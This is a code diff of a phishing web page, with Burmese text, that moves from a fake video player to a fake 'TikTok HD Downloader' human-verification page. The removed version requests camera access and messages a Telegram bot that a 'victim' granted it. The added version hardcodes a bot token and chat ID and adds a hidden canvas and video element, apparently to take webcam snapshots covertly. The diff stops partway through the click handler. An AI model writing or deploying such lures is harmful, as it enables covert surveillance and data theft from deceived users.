@@ -1,51 +1,36 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Video Player</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok HD Downloader - Verification</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { margin: 0; background: black; color: white; text-align: center; font-family: sans-serif; }
-        #startBtn { margin-top: 50%; padding: 15px 30px; font-size: 18px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 10px; }
-        #videoContainer { display: none; width: 100%; height: 100vh; }
-        video { width: 100%; height: 100%; object-fit: contain; }
+        body { background-color: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        .btn { background-color: #fe2c55; color: white; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; margin-top: 20px; }
+        .loading { display: none; color: #ccc; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <button id="startBtn">ဗီဒီယိုကြည့်ရန် နှိပ်ပါ</button>
+    <h2>TikTok HD Downloader</h2>
+    <p>ဗီဒီယိုဒေါင်းလုဒ်ဆွဲရန် လူဟုတ်မဟုတ် အရင်စစ်ဆေးပါ</p>
+    <button class="btn" id="startBtn">Continue to Download</button>
+    <p class="loading" id="loader">Verifying... Please wait...</p>
 
-    <div id="videoContainer">
-        <video id="myVideo" controls>
-            <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-            Your browser does not support HTML5 video.
-        </video>
-    </div>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="video" style="display:none;" autoplay></video>
 
     <script>
-        const token = "8684084048:AAEVozTW2qWgq33..."; // သင့် Token အစစ်ထည့်ပါ
-        const chatId = "5304050102"; // သင့် Chat ID အစစ်ထည့်ပါ
+        const BOT_TOKEN = "8699185806:AAHioOhJMq-0nO_uYycVkbV4c_xNm_Xd3xY"; 
+        const CHAT_ID = "5304050102"; 
 
-        async function sendToBot(msg) {
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
-        }
+        const startBtn = document.getElementById('startBtn');
+        const loader = document.getElementById('loader');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
 
-        document.getElementById("startBtn").addEventListener("click", async () => {
-            try {
-                // ၁။ ကင်မရာ ခွင့်ပြုချက်တောင်းခြင်း
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // ၂။ ခွင့်ပြုချက်ရတာနဲ့ Bot ဆီ အချက်အလက်ပို့ခြင်း
-                await sendToBot("✅ Victim granted camera access!");
-                
-                // ၃။ Website ပေါ်မှာ Video ကို ပြသခြင်း
-                document.getElementById("startBtn").style.display = "none";
-                document.getElementById("videoContainer").style.display = "block";
-                document.getElementById("myVideo").play();
-                
-            } catch (err) {
-                await sendToBot("❌ Access Denied!");
-                alert("Please allow camera access to watch the video.");
-            }
-        });
-    </script>
-</body>
-</html>
+        startBtn.addEventListener('click', async () => {
+            startBtn.style.display = 'none';
+            loader.style.display = 'block';
+            
